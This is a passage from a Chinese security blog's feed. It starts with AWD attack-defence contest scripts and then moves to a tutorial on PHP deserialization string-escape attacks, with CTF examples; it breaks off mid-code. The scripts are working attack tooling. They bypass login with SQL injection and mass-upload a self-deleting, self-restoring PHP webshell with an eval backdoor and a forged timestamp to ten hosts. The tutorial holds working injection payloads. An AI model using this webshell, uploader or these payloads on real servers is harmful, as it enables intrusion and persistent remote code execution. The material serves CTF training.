class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">filename=<span class="string">"./webshell.php"</span> <span class="comment">#webshell文件位置</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UploadFile</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,upload_url,prefix_url,login_url=<span class="string">""</span>)</span>:</span></span><br><span class="line">        self.session=requests.session()</span><br><span class="line">        self.login_url=login_url</span><br><span class="line">        self.upload_url=upload_url</span><br><span class="line">        self.prefix_url=prefix_url</span><br><span class="line">        self.suffix_url=<span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"username"</span>: <span class="string">"admin'#"</span>,</span><br><span class="line">            <span class="string">"password"</span>: <span class="string">"asd"</span></span><br><span class="line">        &#125;</span><br><span class="line">        self.session.post(url=self.login_url, data=data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"</span>,</span><br><span class="line">            <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>,</span><br><span class="line">            <span class="string">"Content-Length"</span>: <span class="string">"623"</span></span><br><span class="line">        &#125;</span><br><span class="line">        f = &#123;</span><br><span class="line">            <span class="comment"># "localUrl": (None, "webshell.php"),</span></span><br><span class="line">            <span class="string">"pic"</span>: (<span class="string">"webshell.php"</span>, open(filename, <span class="string">"rb"</span>), <span class="string">"application/octet-stream"</span>)</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        res = self.session.post(url=self.upload_url, files=f, headers=headers)</span><br><span class="line">        self.suffix_url=self.upload_path(res.text)</span><br><span class="line">        print(res.status_code)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">active_webshell</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.session.get(url=self.prefix_url+self.suffix_url, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get upload file path</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_path</span><span class="params">(self,content)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        comp = re.compile(<span class="string">"/upload.*?[.]php"</span>)</span><br><span class="line">        path = comp.findall(content)</span><br><span class="line">        <span class="keyword">if</span> path:</span><br><span class="line">            print(path[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">return</span> path[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_upload</span><span class="params">(host,port)</span>:</span></span><br><span class="line">    login_url = <span class="string">"http://&#123;&#125;:&#123;&#125;/login.php"</span>.format(host, port)</span><br><span class="line">    upload_url = <span class="string">"http://&#123;&#125;:&#123;&#125;/admin/upload.php"</span>.format(host, port)</span><br><span class="line">    prefix_url = <span class="string">"http://&#123;&#125;:&#123;&#125;/admin"</span>.format(host, port)</span><br><span class="line">    uploadfile=UploadFile(upload_url,prefix_url,login_url)</span><br><span class="line">    uploadfile.login() <span class="comment">#login in</span></span><br><span class="line">    uploadfile.upload()<span class="comment"># upload undead webshell</span></span><br><span class="line">    uploadfile.active_webshell()<span class="comment"># active undead webshell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    base_host=<span class="string">"ip"</span></span><br><span class="line">    base_port=<span class="number">8100</span></span><br><span class="line">    tasks=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">        t=Thread(target=start_upload,args=(base_host,base_port+i))</span><br><span class="line">        tasks.append(t)</span><br><span class="line">    <span class="keyword">for</span> task <span class="keyword">in</span> tasks:</span><br><span class="line">        task.start()</span><br><span class="line">    <span class="keyword">for</span> task <span class="keyword">in</span> tasks:</span><br><span class="line">        task.join()</span><br></pre></td></tr></table></figure><h3 id="随机文件名"><a href="#随机文件名" class="headerlink" title="随机文件名"></a>随机文件名</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">filename=<span class="string">"./webshell.php"</span> <span class="comment">#webshell文件位置</span></span><br><span class="line">shell_content=<span class="string">'''</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"> ignore_user_abort(true);</span></span><br><span class="line"><span class="string"> set_time_limit(0);</span></span><br><span class="line"><span class="string"> unlink(__FILE__);</span></span><br><span class="line"><span class="string"> $file = '%s';</span></span><br><span class="line"><span class="string"> $code = '&lt;?php if(md5($_GET["pass"])=="47fe7f87f45e7403be0a9eb7a30a2970")&#123;@eval($_POST[a]);&#125; ?&gt;';</span></span><br><span class="line"><span class="string"> while (1)&#123;</span></span><br><span class="line"><span class="string"> if(md5(file_get_contents($file))!==md5($code)) &#123;</span></span><br><span class="line"><span class="string"> file_put_contents($file,$code);</span></span><br><span class="line"><span class="string"> system("touch -m -d '2018-12-01 09:10:12' $file");</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"> usleep(1000);</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string">?&gt;'''</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UploadFile</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,host,port)</span>:</span></span><br><span class="line">        self.session=requests.session()</span><br><span class="line">        self.host=host</span><br><span class="line">        self.port=port</span><br><span class="line">        self.login_url = <span class="string">"http://&#123;&#125;:&#123;&#125;/login.php"</span>.format(host, port)</span><br><span class="line">        self.upload_url = <span class="string">"http://&#123;&#125;:&#123;&#125;/admin/upload.php"</span>.format(host, port)</span><br><span class="line">        self.prefix_url = <span class="string">"http://&#123;&#125;:&#123;&#125;/admin"</span>.format(host, port)</span><br><span class="line">        self.suffix_url=<span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"username"</span>: <span class="string">"admin'#"</span>,</span><br><span class="line">            <span class="string">"password"</span>: <span class="string">"asd"</span></span><br><span class="line">        &#125;</span><br><span class="line">        self.session.post(url=self.login_url, data=data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"</span>,</span><br><span class="line">            <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>,</span><br><span class="line">            <span class="string">"Content-Length"</span>: <span class="string">"623"</span></span><br><span class="line">        &#125;</span><br><span class="line">        shell_name=get_shell_name(self.host,self.port)</span><br><span class="line">        f = &#123;</span><br><span class="line">            <span class="comment"># "localUrl": (None, "webshell.php"),</span></span><br><span class="line">            <span class="string">"pic"</span>: (<span class="string">"webshell.php"</span>, shell_content%(shell_name), <span class="string">"application/octet-stream"</span>)</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        res = self.session.post(url=self.upload_url, files=f, headers=headers)</span><br><span class="line">        self.suffix_url=self.upload_path(res.text)</span><br><span class="line">        print(res.status_code)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">active_webshell</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            absolute_url=self.prefix_url+self.suffix_url</span><br><span class="line">            print(absolute_url)</span><br><span class="line">            self.session.get(url=absolute_url, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get upload file path</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_path</span><span class="params">(self,content)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        comp = re.compile(<span class="string">"/upload.*?[.]php"</span>)</span><br><span class="line">        path = comp.findall(content)</span><br><span class="line">        <span class="keyword">if</span> path:</span><br><span class="line">            print(path[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">return</span> path[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line"><span class="comment"># generate md5 filename</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_shell_name</span><span class="params">(host,port)</span>:</span></span><br><span class="line">    secret_key=<span class="string">"ye1s"</span></span><br><span class="line">    strings=<span class="string">"&#123;&#125;&#123;&#125;"</span>.format(host,port)+secret_key</span><br><span class="line">    md5=hashlib.md5()</span><br><span class="line">    md5.update(strings.encode())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"."</span>+md5.hexdigest()[<span class="number">0</span>:<span class="number">6</span>]+<span class="string">".php"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_upload</span><span class="params">(host,port)</span>:</span></span><br><span class="line">    uploadfile=UploadFile(host,port)</span><br><span class="line">    uploadfile.login() <span class="comment">#login in</span></span><br><span class="line">    uploadfile.upload()<span class="comment"># upload undead webshell</span></span><br><span class="line">    uploadfile.active_webshell()<span class="comment"># active undead webshell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    base_host=<span class="string">"ip"</span></span><br><span class="line">    base_port=<span class="number">8100</span></span><br><span class="line">    tasks=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">        t=Thread(target=start_upload,args=(base_host,base_port+i))</span><br><span class="line">        tasks.append(t)</span><br><span class="line">    <span class="keyword">for</span> task <span class="keyword">in</span> tasks:</span><br><span class="line">        task.start()</span><br><span class="line">    <span class="keyword">for</span> task <span class="keyword">in</span> tasks:</span><br><span class="line">        task.join()</span><br></pre></td></tr></table></figure><h2 id="一句话写文件"><a href="#一句话写文件" class="headerlink" title="一句话写文件"></a>一句话写文件</h2><pre><code class="pythoin"></code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;AWD的攻防思路和脚本整理&lt;/p&gt;
    
    </summary>
    
    
      <category term="其他" scheme="https://blog.cfyqy.com/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="AWD" scheme="https://blog.cfyqy.com/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>PHP 反序列化字符逃匿</title>
    <link href="https://blog.cfyqy.com/article/f5a2dfc5.html"/>
    <id>https://blog.cfyqy.com/article/f5a2dfc5.html</id>
    <published>2020-09-16T09:24:46.000Z</published>
    <updated>2020-09-24T03:06:49.930Z</updated>
    
    <content type="html"><![CDATA[<p>PHP 反序列化逃匿学习小记<br>详情可看此篇文章: <a href="https://www.moonback.xyz/2020/04/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">PHP反序列化字符逃逸</a>  </p><a id="more"></a><h1 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h1><p>在反序列化前，对序列化后的字符串进行替换或者修改，使得字符串的长度发生了变化，通过构造特定的字符串，导致对象注入等恶意操作。     </p><h1 id="PHP-反序列化特性"><a href="#PHP-反序列化特性" class="headerlink" title="PHP 反序列化特性"></a>PHP 反序列化特性</h1><ol><li>PHP 在反序列化时，底层代码是以 ; 作为字段的分隔，以 } 作为结尾(字符串除外)，并且是根据长度判断内容的。</li><li>在反序列化的时候php会根据s所指定的字符长度去读取后边的字符。如果指定的长度错误则反序列化就会失败 </li><li>对类中不存在的属性也会进行反序列化</li></ol><h1 id="逃匿类型"><a href="#逃匿类型" class="headerlink" title="逃匿类型"></a>逃匿类型</h1><h2 id="过滤后字符变多"><a href="#过滤后字符变多" class="headerlink" title="过滤后字符变多"></a>过滤后字符变多</h2><p>示例代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'x'</span>,<span class="string">'yy'</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line">$username = $_GET[<span class="string">'u'</span>];</span><br><span class="line">$password = <span class="string">"aaa"</span>;</span><br><span class="line">$user = <span class="keyword">array</span>($username, $password);</span><br><span class="line">$s = serialize($user);</span><br><span class="line">$r = filter($s);</span><br><span class="line"><span class="keyword">echo</span> $r;</span><br><span class="line">$a= unserialize($r);</span><br><span class="line"><span class="keyword">if</span>($a[<span class="number">1</span>]===<span class="string">'admin'</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此题中对序列化字符串中的x替换为yy,可能导致字符串长度增加。    </p><p>当传入u=admin,序列化为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;s:5:<span class="string">"admin"</span>;i:1;s:3:<span class="string">"aaa"</span>;&#125;</span><br></pre></td></tr></table></figure><p>反序列化后满足不了<code>$a[1]===&#39;admin&#39;</code>条件   </p><p>当传入<code>u=xxxxxxxxxxxxxxxxxxx&quot;;i:1;s:5:&quot;admin&quot;;}</code>，此时替换序列化的结果为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:a:2:&#123;i:0;s:38:<span class="string">"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy"</span>;i:1;s:5:<span class="string">"admin"</span>;&#125;<span class="string">";i:1;s:3:"</span>aaa<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>此时yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy的长度刚好为38，不会报错，再加上后面的;i:1;s:5:”admin”;}成功反序列化，后面的就被忽略了。<br><img src="../../images/php/serialize/1.png" alt=""></p><p>x个数的计算<br>首先我们要确定需要添加的内容，也就是后面一串，即”;i:1;s:5:”admin”;}，长度为19(设为m)，满足以下式子(设有n个x字符，”;i:1;s:5:”admin”;}前面有y个非x字符)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n+y+m=2n+y // 原来字符串的长度 = 替换后去掉m的长度</span><br></pre></td></tr></table></figure><p>解方程得n=19，即我们要有19个x，y随意，从等式可以看出抵消了</p><p>如果碰到除不尽的情况，我们可以在”;i:1;s:5:”admin”;}前面增加一些非x字符，类似</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="string">";i:1;s:5:"</span>admin<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>此时m的长度大于19</p><h2 id="过滤后字符变少"><a href="#过滤后字符变少" class="headerlink" title="过滤后字符变少"></a>过滤后字符变少</h2><p>示例代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'sec'</span>,<span class="string">''</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line">$username = $_GET[<span class="string">'u'</span>];</span><br><span class="line">$password = $_GET[<span class="string">'p'</span>];</span><br><span class="line">$auth=<span class="string">"guest"</span>;</span><br><span class="line">$user = <span class="keyword">array</span>($username, $password,$auth);</span><br><span class="line">$s = serialize($user);</span><br><span class="line">$r = filter($s);</span><br><span class="line"><span class="keyword">echo</span> $r;</span><br><span class="line">$a= unserialize($r);</span><br><span class="line"><span class="keyword">if</span>($a[<span class="number">2</span>]===<span class="string">'admin'</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要想得到flag，就要使得”;i:2;s:5:”admin”;}，长度为19，经过观察序列化后”;i:1;s:这部分是不会改变的，因为整个payload肯定是不超过100个字符的，所以加上后面的长度”;i:1;s:xx:” 为12个字符，这里存在着sec的替换，我们可以输入4个sec替换为空格，刚好空出12个字符，可以将”;i:1;s:xx:”这12个字符反序列化后在第一个元素值中，使得后面逃匿。<br>最后payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u=secsecsecsec&amp;p=<span class="string">";i:1;s:4:"</span><span class="built_in">eval</span><span class="string">";i:2;s:5:"</span>admin<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>也可以多添加几个sec，假设为5个，此时空出15个字符，减去”;i:1;s:xx:”这12个字符，还剩下3个，可以再输入三个字符填充。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u=secsecsecsecsec&amp;p=123<span class="string">";i:1;s:4:"</span><span class="built_in">eval</span><span class="string">";i:2;s:5:"</span>admin<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p><img src="../../images/php/serialize/2.png" alt=""></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="2020安恒四月月赛"><a href="#2020安恒四月月赛" class="headerlink" title="2020安恒四月月赛"></a>2020安恒四月月赛</h2><p>安恒杯月赛 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="string">"index.php"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b = <span class="string">'gqy'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $c = <span class="string">'a'</span>.<span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//flag.php</span></span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'nice'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($_GET[<span class="string">'a'</span>],$_GET[<span class="string">'b'</span>]);</span><br><span class="line"><span class="comment">//省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span></span><br><span class="line">$e = serialize($a);</span><br><span class="line">$c = write($e);</span><br><span class="line"><span class="keyword">echo</span> $c;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$d = read($c);</span><br><span class="line"><span class="keyword">echo</span> $d;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$b = unserialize($d);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反序列利用链接为 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B __destruct() -&gt; C __toString()</span><br></pre></td></tr></table></figure><p>正常利用序列化链为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b = <span class="string">'gqy'</span>;</span><br><span class="line">    <span class="comment">// function __destruct()&#123;</span></span><br><span class="line">    <span class="comment">//     $c = 'a'.$this-&gt;b;</span></span><br><span class="line">    <span class="comment">//     echo $c;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="comment">// function __toString()&#123;</span></span><br><span class="line">    <span class="comment">//     echo file_get_contents($this-&gt;c);</span></span><br><span class="line">    <span class="comment">//     return 'nice';</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line">$c=<span class="keyword">new</span> C;</span><br><span class="line">$c-&gt;c=<span class="string">'flag.php'</span>;</span><br><span class="line">$b=<span class="keyword">new</span> B;</span><br><span class="line">$b-&gt;b=$c;</span><br><span class="line">$ser=<span class="keyword">new</span> A(<span class="string">"test"</span>,$b);</span><br><span class="line"><span class="keyword">echo</span> serialize($ser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>序列化结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:<span class="string">"A"</span>:2:&#123;s:8:<span class="string">"username"</span>;s:4:<span class="string">"test"</span>;s:8:<span class="string">"password"</span>;O:1:<span class="string">"B"</span>:1:&#123;s:1:<span class="string">"b"</span>;O:1:<span class="string">"C"</span>:1:&#123;s:1:<span class="string">"c"</span>;s:8:<span class="string">"flag.php"</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>下面是我们实际上要添加的字符串</p><figure class="highlight bash"><table><tr><td 